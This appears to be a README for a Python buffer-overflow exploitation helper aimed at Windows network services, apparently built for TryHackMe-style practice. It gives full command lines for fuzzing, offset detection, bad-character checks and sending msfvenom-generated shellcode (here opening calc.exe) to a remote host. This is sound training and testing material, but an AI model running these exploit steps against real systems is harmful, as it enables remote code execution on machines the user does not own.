# Buffer-Overflow

## ig-buffer-overflow.py
* Help functions for exploting buffer overflow vulnerabilities in a Windows remote binary. 
* Tested with: Vanilla Buffer Overflow, Structured Exception Handling Overwrite (SEH Overwrite), Egg Hunting.

## Usage

test - Sends simple string (AAAAA) with buffer size and buffer head for memory test
```
./ig-buffer-overflow.py -m test --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/'
```

cyclic - Sends cyclic pattern to help identify memory positions
```
./ig-buffer-overflow.py -m cyclic --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/'
```

checkoffset - Auxiliary mode for offset detection on pattern
```
./ig-buffer-overflow.py -m checkoffset --value=31704331 --length=5000
```

write - Writes hex value to buffer offset
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809
```

write - Writes hex value to buffer offset and additional content before and/or after the offset content
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --before=90909090 --after=9090
```

write - Writes badchars (before or after offset content) for badchar verification
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --after=badchar --exclude=000a
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --before=badchar --exclude=000a
```

write - Sends malicious shell code (hex string file) via buffer overflow
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --before=shellcode --shellcode=opencalc --nops=10
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --after=shellcode --shellcode=opencalc
```

## Parameters:
* --help|-h	: Show script usage.
* --norec|-n	: Don't wait for receive message after connect.
* --mode|-m	: Select script mode (test|cyclic|write|checkoffset).
* --rhost		: Remote host IP.
* --rport		: Remote host port.
* --buffsize	: Amount of variable bytes to send.
* --buffhead	: Static buffer string set at the beginning of the buffer.
  * Is usually the crash string. Size is considered in buffSize calc.
* --interact	: Interact with the application before sending the payload. For each message in string (separated with ';;'), sends and receives response from app.
  * Example: --interact='login;;user' --> Sends 'login', gets response, sends 'user', gets response, and finally sends the generated payload
* --offset	: Place in buffer where content can be added.
* --hexcontent	: Hex string to add at the offset position.
  * Can be considered as big endian (default) or little endian (will be reversed).
  * Use 'g' or 'l' to delimit the order. Examples:
    * 'g01020304l05060708' --> will send '0102030408070605'
    * '01020304' --> will send '01020304'
* --before|after	: Writes additional content (hex string) before and/or after the offset content.
  * If content is 'badchar', content will be a generated badchar list. Used for bad char testing.
  * If content is 'shellcode', --shellcode parameter will be expected.
  * Other content will be considered as big endian (default) or little endian (will be reversed). Same as --hexcontent.
* --exclude	: List of chars (formatted as hex string) to be excluded from badchar list.
* --shellcode	: Hex shell code file generated using msfvenom. 
  * Example: msfvenom -p windows/exec cmd=calc.exe -b '\x00' -f hex EXITFUNC=thread -o opencalc
* --nopsb|nopsa	: Amount of nops to add before and/or after the additional write content (be if badchars, shellcode or simple hexstring). Default is 0.
* --value		: Offset value.
* --length	: Cyclic pattern length.


## Vanilla Buffer Overflow example

[TryHackMe - Brainstorm - Write-up](https://github.com/isabellecda/writeups/tree/main/TryHackMe/Brainstorm)

## SEH Overwrite example

TODO

## Egg Hunting example

TODO
